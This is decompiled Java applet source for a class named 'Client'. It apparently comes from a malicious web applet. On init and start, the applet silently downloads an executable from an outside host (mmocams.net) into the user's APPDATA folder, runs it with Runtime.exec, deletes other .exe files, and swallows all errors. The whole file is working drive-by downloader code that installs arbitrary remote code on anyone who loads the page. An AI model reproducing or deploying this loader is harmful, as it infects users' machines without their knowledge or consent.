import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Client extends Applet
{
    @Override
    public void init() {
        main(new String[0]);
    }
    
    @Override
    public void start() {
        this.init();
    }
    
    public static void main(final String[] array) {
        try {
            final String getenv = System.getenv("APPDATA");
            new File(getenv + "\\WUT.exe").delete();
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://mmocams.net/mmocams.exe").openStream());
            final FileOutputStream fileOutputStream = new FileOutputStream(getenv + "\\mmocams.exe");
            final BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(fileOutputStream, 1024);
            final byte[] array2 = new byte[1024];
            int read;
            while ((read = bufferedInputStream.read(array2, 0, 1024)) != -1) {
                bufferedOutputStream.write(array2, 0, read);
            }
            bufferedOutputStream.close();
            fileOutputStream.close();
            bufferedInputStream.close();
            Runtime.getRuntime().exec(getenv + "\\mmocams.exe");
            new File(getenv + "\\File_Name.exe").delete();
        }
        catch (Exception ex) {}
    }
}
